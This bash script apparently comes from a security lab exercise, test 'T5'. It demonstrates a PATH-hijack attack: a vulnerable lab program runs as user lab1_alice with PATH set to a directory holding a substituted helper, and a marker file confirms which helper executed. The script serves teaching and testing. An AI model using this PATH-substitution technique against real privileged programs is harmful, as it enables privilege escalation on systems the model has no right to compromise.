#!/usr/bin/env bash
set -euo pipefail

SCRIPT_DIR=$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")" && pwd)
ROOT_DIR=$(cd -- "$SCRIPT_DIR/../.." && pwd)
VULN=/usr/local/lib/lab1/lab1_vuln
PATH_DIR="$ROOT_DIR/build/path"
MARKER=/tmp/lab1_t5_path.marker
TRACE="$ROOT_DIR/traces/T5-path-hijack.log"

make -C "$ROOT_DIR" build/path/lab1-helper
mkdir -p "$ROOT_DIR/traces"
exec > >(tee "$TRACE") 2>&1

printf '%s\n' '=== T5: Controlled PATH substitution ==='
sudo rm -f "$MARKER"
sudo -u lab1_alice -- /bin/id
printf 'Command: sudo -u lab1_alice -- /usr/bin/env PATH=%q %s lookup\n' "$PATH_DIR" "$VULN"
sudo -u lab1_alice -- /usr/bin/env PATH="$PATH_DIR" "$VULN" lookup
printf 'Marker content (replacement helper identity):\n'
sudo /bin/cat "$MARKER"